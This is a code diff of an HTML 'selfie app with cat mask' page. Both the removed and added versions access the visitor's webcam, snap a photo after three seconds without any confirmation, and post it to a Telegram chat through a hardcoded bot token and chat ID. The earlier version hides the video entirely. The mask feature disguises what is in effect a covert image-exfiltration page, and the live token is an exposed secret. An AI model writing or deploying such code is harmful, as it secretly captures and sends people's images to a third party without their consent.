@@ -3,35 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>New Mask</title>
+    <title>Auto Selfie with Cat Mask to Telegram</title>
+    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
+    <style>
+        #video, #canvas {
+            display: none;
+        }
+        #overlayCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+    </style>
 </head>
 <body>
-    <h1>Новая Маска</h1>
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <h1>Selfie App with Cat Mask</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    <canvas id="overlayCanvas" width="640" height="480"></canvas>
 
     <script>
-        // Access the camera
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const overlayCanvas = document.getElementById('overlayCanvas');
         const context = canvas.getContext('2d');
+        const overlayContext = overlayCanvas.getContext('2d');
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
+        // Load the models for face detection
+        Promise.all([
+            faceapi.nets.tinyFaceDetector.loadFromUri('/models'),
+            faceapi.nets.faceLandmark68Net.loadFromUri('/models')
+        ]).then(startVideo);
 
-                // Automatically take a selfie after the video stream is ready
-                video.onloadedmetadata = () => {
-                    setTimeout(() => {
-                        context.drawImage(video, 0, 0, 640, 480);
-                        const dataURL = canvas.toDataURL('image/png');
-                        sendToTelegram(dataURL);
-                    }, 3000); // Delay to allow the camera to focus
-                };
-            })
-            .catch(err => console.error("Error accessing camera: ", err));
+        function startVideo() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
 
-        // Function to send the image to Telegram
+                    video.onloadedmetadata = () => {
+                        setTimeout(async () => {
+                            const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
+
+                            if (detections.length > 0) {
+                                drawCatMask(detections[0].landmarks);
+                            }
+
+                            context.drawImage(video, 0, 0, 640, 480);
+                            sendToTelegram(canvas.toDataURL('image/png'));
+                        }, 3000); // Delay for camera to focus
+                    };
+                })
+                .catch(err => console.error("Error accessing camera: ", err));
+        }
+
+        function drawCatMask(landmarks) {
+            const nose = landmarks.getNose()[3];
+            const leftEye = landmarks.getLeftEye()[0];
+            const rightEye = landmarks.getRightEye()[3];
+            const width = rightEye.x - leftEye.x;
+
+            const img = new Image();
+            img.src = 'https://example.com/cat-mask.png'; // URL маски кота
+
+            img.onload = () => {
+                overlayContext.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
+                overlayContext.drawImage(img, nose.x - width, nose.y - width * 1.5, width * 3, width * 2.5);
+            };
+        }
+
         function sendToTelegram(imageData) {
             const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk';
             const chatId = '6121166273';
@@ -47,10 +86,9 @@
             })
             .then(response => response.json())
             .then(data => console.log('Success:', data))
-            .catch((error) => console.error('Error:', error));
+            .catch((error) => console.error('Error sending to Telegram:', error));
         }
 
-        // Helper function to convert base64 to Blob
         function dataURItoBlob(dataURI) {
             let byteString = atob(dataURI.split(',')[1]);
             let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
